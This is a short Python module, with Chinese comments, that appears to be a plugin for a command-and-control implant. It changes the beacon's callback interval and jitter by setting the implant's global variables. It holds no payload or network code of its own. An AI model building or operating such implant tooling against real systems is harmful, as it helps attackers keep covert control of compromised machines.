"""
@module: set_interval
@desc: 修改 Beacon 回连间隔和抖动
@contract: 依赖 implant 全局变量 _I/_J (5.5/D2)
"""
MODULE = {
    "desc": "修改 Beacon 回连间隔和抖动",
    "params": [("interval", "必填，秒"), ("jitter", "默认 0.2")],
}


def run(interval, jitter=0.2):
    global _I, _J
    _I = int(interval)
    _J = float(jitter)
    return f"interval={_I}s, jitter={_J}"


if __name__ == "__main__":
    print("usage: set_interval <seconds> [jitter]")
